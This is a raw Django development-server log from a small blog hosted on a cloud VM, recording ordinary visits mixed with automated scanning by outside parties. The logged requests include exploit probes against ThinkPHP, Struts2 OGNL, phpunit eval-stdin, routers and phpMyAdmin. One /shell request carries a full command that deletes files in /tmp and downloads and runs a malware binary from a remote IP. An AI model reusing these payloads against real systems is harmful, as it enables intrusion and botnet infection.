Watching for file changes with StatReloader
[08/Aug/2020 15:19:26] "GET / HTTP/1.1" 200 1833
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[05/Sep/2020 19:20:29] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[05/Sep/2020 19:53:24] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[05/Sep/2020 19:56:15] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[05/Sep/2020 20:00:36] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[05/Sep/2020 20:01:53] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /api/jsonws/invoke
[05/Sep/2020 20:47:17] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[05/Sep/2020 20:50:33] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[05/Sep/2020 20:50:35] "GET /favicon.ico HTTP/1.1" 404 2613
Invalid HTTP_HOST header: 'ukraineblog.tk'. You may need to add 'ukraineblog.tk' to ALLOWED_HOSTS.
Bad Request: /
[05/Sep/2020 20:53:30] "GET / HTTP/1.1" 400 60393
Invalid HTTP_HOST header: 'ukraineblog.tk'. You may need to add 'ukraineblog.tk' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[05/Sep/2020 20:53:32] "GET /favicon.ico HTTP/1.1" 400 60432
Not Found: /portal/redlion
[05/Sep/2020 20:58:19] "GET /portal/redlion HTTP/1.1" 404 2622
/home/yasusianchik/Blog/Blog/settings.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
August 08, 2020 - 15:46:26
Django version 3.0.8, using settings 'Blog.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
Invalid HTTP_HOST header: 'ukraineblog.tk'. You may need to add 'ukraineblog.tk' to ALLOWED_HOSTS.
Bad Request: /
[05/Sep/2020 21:10:43] "GET / HTTP/1.1" 400 60602
Invalid HTTP_HOST header: 'ukraineblog.tk'. You may need to add 'ukraineblog.tk' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[05/Sep/2020 21:10:44] "GET /favicon.ico HTTP/1.1" 400 60769
/home/yasusianchik/Blog/Blog/settings.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
September 05, 2020 - 21:10:06
Django version 3.0.8, using settings 'Blog.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
[05/Sep/2020 21:13:52] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[05/Sep/2020 21:13:54] "GET /favicon.ico HTTP/1.1" 404 2615
[05/Sep/2020 21:25:44] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[05/Sep/2020 21:58:41] "GET / HTTP/1.0" 400 59638
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[05/Sep/2020 21:58:45] "GET / HTTP/1.1" 400 59018
[05/Sep/2020 22:15:01] "GET / HTTP/1.1" 200 5033
[05/Sep/2020 22:26:22] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[05/Sep/2020 22:27:22] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
[05/Sep/2020 22:31:10] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[05/Sep/2020 22:31:11] "GET /favicon.ico HTTP/1.1" 404 2615
[05/Sep/2020 22:31:28] "GET / HTTP/1.1" 200 5033
[05/Sep/2020 22:31:39] "GET / HTTP/1.1" 200 5033
[05/Sep/2020 22:31:43] "GET /users/register/ HTTP/1.1" 200 3790
[05/Sep/2020 22:40:30] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[05/Sep/2020 22:57:08] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /boaform/admin/formPing
[06/Sep/2020 00:20:27] "POST /boaform/admin/formPing HTTP/1.1" 400 60340
Not Found: /boaform/admin/formLogin
[06/Sep/2020 01:24:33] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[06/Sep/2020 01:56:02] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
[06/Sep/2020 01:56:02] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 -
[06/Sep/2020 03:05:24] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 03:25:51] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[06/Sep/2020 05:24:07] "GET / HTTP/1.0" 400 60091
Not Found: /manager/html
[06/Sep/2020 05:27:51] "GET /manager/html HTTP/1.1" 404 2619
----------------------------------------
Exception happened during processing of request from ('167.248.133.52', 40250)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[06/Sep/2020 05:29:37] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('167.248.133.52', 51072)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[06/Sep/2020 05:29:37] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 05:37:10] "GET / HTTP/1.1" 200 5033
Not Found: /hudson
[06/Sep/2020 08:49:29] "GET /hudson HTTP/1.1" 404 2598
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /shell
[06/Sep/2020 09:29:38] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86+w00dy.jaws HTTP/1.1" 400 61281
Not Found: /solr/admin/info/system
[06/Sep/2020 11:02:34] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
Not Found: /boaform/admin/formLogin
[06/Sep/2020 11:09:22] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[06/Sep/2020 11:09:56] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[06/Sep/2020 11:18:59] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
[06/Sep/2020 11:21:54] "GET / HTTP/1.1" 200 5033
Not Found: /index.php
[06/Sep/2020 11:22:09] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
[06/Sep/2020 12:21:53] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[06/Sep/2020 12:21:54] "GET /favicon.ico HTTP/1.1" 404 2615
[06/Sep/2020 12:21:55] "GET /users/register/ HTTP/1.1" 200 3790
[06/Sep/2020 12:21:56] "GET /users/login/ HTTP/1.1" 200 2689
[06/Sep/2020 12:21:57] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 12:54:11] "GET / HTTP/1.1" 200 5033
Not Found: /api/jsonws/invoke
[06/Sep/2020 13:11:25] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[06/Sep/2020 14:33:06] "GET / HTTP/1.1" 200 5033
Not Found: /TP/public/index.php
[06/Sep/2020 14:47:33] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
[06/Sep/2020 14:47:34] "GET /TP/index.php HTTP/1.1" 404 2616
Not Found: /thinkphp/html/public/index.php
[06/Sep/2020 14:47:35] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2670
Not Found: /html/public/index.php
[06/Sep/2020 14:47:35] "GET /html/public/index.php HTTP/1.1" 404 2643
Not Found: /public/index.php
[06/Sep/2020 14:47:36] "GET /public/index.php HTTP/1.1" 404 2628
Not Found: /TP/html/public/index.php
[06/Sep/2020 14:47:37] "GET /TP/html/public/index.php HTTP/1.1" 404 2652
Not Found: /elrekt.php
[06/Sep/2020 14:47:37] "GET /elrekt.php HTTP/1.1" 404 2610
Not Found: /index.php
[06/Sep/2020 14:47:40] "GET /index.php HTTP/1.1" 404 2607
[06/Sep/2020 14:47:41] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 16:24:06] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 16:25:17] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 17:00:27] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[06/Sep/2020 17:15:55] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
[06/Sep/2020 17:36:45] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 17:36:53] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 17:36:53] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 17:37:25] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 18:25:58] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[06/Sep/2020 18:26:16] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
[06/Sep/2020 19:47:08] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 20:02:38] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 20:19:01] "GET / HTTP/1.1" 200 5033
[06/Sep/2020 21:08:53] "GET / HTTP/1.1" 200 5033
Not Found: /portal/redlion
[06/Sep/2020 22:01:24] "GET /portal/redlion HTTP/1.1" 404 2622
Not Found: /boaform/admin/formLogin
[06/Sep/2020 22:35:53] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /muieblackcat
[06/Sep/2020 22:36:36] "GET /muieblackcat HTTP/1.1" 404 2616
Not Found: //phpMyAdmin/scripts/setup.php
[06/Sep/2020 22:36:36] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 2667
Not Found: //phpmyadmin/scripts/setup.php
[06/Sep/2020 22:36:36] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 2667
Not Found: //PMA/scripts/setup.php
[06/Sep/2020 22:36:36] "GET //PMA/scripts/setup.php HTTP/1.1" 404 2646
Not Found: //admin/scripts/setup.php
[06/Sep/2020 22:36:37] "GET //admin/scripts/setup.php HTTP/1.1" 404 2652
Not Found: //dbadmin/scripts/setup.php
[06/Sep/2020 22:36:37] "GET //dbadmin/scripts/setup.php HTTP/1.1" 404 2658
Not Found: //mysql/scripts/setup.php
[06/Sep/2020 22:36:37] "GET //mysql/scripts/setup.php HTTP/1.1" 404 2652
Not Found: /solr/admin/info/system
[06/Sep/2020 22:50:12] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[06/Sep/2020 22:52:04] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[06/Sep/2020 22:54:41] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[06/Sep/2020 22:55:22] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /api/jsonws/invoke
[06/Sep/2020 23:23:41] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /level/15/exec/-/sh/run/CR
[06/Sep/2020 23:59:37] "GET /level/15/exec/-/sh/run/CR HTTP/1.1" 404 2658
[07/Sep/2020 00:09:20] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Sep/2020 00:21:31] "GET / HTTP/1.0" 400 60091
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[07/Sep/2020 00:23:45] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
[07/Sep/2020 00:29:57] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[07/Sep/2020 00:42:27] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
[07/Sep/2020 00:54:19] "GET / HTTP/1.1" 200 5033
[07/Sep/2020 02:19:23] "GET / HTTP/1.1" 200 5033
[07/Sep/2020 02:26:03] "GET / HTTP/1.1" 200 5033
[07/Sep/2020 04:29:39] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Sep/2020 05:06:11] "GET / HTTP/1.0" 400 60014
[07/Sep/2020 06:05:31] "GET / HTTP/1.1" 200 5033
Not Found: /index.action
[07/Sep/2020 06:05:37] "GET /index.action HTTP/1.1" 404 2616
Not Found: /login.action
[07/Sep/2020 06:05:40] "GET /login.action HTTP/1.1" 404 2616
Not Found: /index.do
[07/Sep/2020 06:05:43] "GET /index.do HTTP/1.1" 404 2604
Not Found: /index.jsp
[07/Sep/2020 06:05:46] "GET /index.jsp HTTP/1.1" 404 2607
Not Found: /login.do
[07/Sep/2020 06:05:48] "GET /login.do HTTP/1.1" 404 2604
Not Found: /login.jsp
[07/Sep/2020 06:05:52] "GET /login.jsp HTTP/1.1" 404 2607
Forbidden (CSRF cookie not set.): /
[07/Sep/2020 06:05:58] "POST / HTTP/1.1" 403 2864
Forbidden (CSRF cookie not set.): /
[07/Sep/2020 06:06:03] "POST / HTTP/1.1" 403 2864
Not Found: /index.action
[07/Sep/2020 06:06:06] "POST /index.action HTTP/1.1" 404 2617
Not Found: /login.action
[07/Sep/2020 06:06:09] "POST /login.action HTTP/1.1" 404 2617
Not Found: /index.do
[07/Sep/2020 06:06:13] "POST /index.do HTTP/1.1" 404 2605
Forbidden (CSRF cookie not set.): /
[07/Sep/2020 06:06:21] "POST / HTTP/1.1" 403 2864
Not Found: /index.action
[07/Sep/2020 06:06:24] "POST /index.action HTTP/1.1" 404 2617
Not Found: /login.action
[07/Sep/2020 06:06:27] "POST /login.action HTTP/1.1" 404 2617
Not Found: /index.do
[07/Sep/2020 06:06:30] "POST /index.do HTTP/1.1" 404 2605
Forbidden (CSRF cookie not set.): /
[07/Sep/2020 06:06:39] "POST / HTTP/1.1" 403 2864
[07/Sep/2020 06:06:42] "GET /?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 200 5033
Not Found: /index.action
[07/Sep/2020 06:06:46] "GET /index.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 3040
Not Found: /login.action
[07/Sep/2020 06:06:48] "GET /login.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 3040
----------------------------------------
Exception happened during processing of request from ('167.248.133.52', 58808)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[07/Sep/2020 06:34:49] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('167.248.133.52', 42034)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
